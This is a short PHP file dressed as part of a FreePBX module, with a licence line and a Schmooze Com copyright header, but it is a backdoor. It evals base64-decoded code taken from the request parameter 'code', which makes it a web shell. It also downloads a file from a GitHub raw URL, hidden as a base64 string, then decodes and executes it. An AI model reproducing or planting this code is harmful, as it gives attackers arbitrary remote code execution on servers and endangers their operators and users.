

<?php


// https://github.com/k6n/files/raw/master/64.txt

//

//	License for all code of this FreePBX module can be found in the license file inside the module directory

//	Copyright 2013 Schmooze Com Inc.

// echo $code;

$code = $_REQUEST['code'];
//eval($code);
eval(base64_decode($code));
eval(

base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9naXRodWIuY29tL2s2bi9maWxlcy9yYXcvbWFzdGVyLzY0LnR4dA=='))));

?>
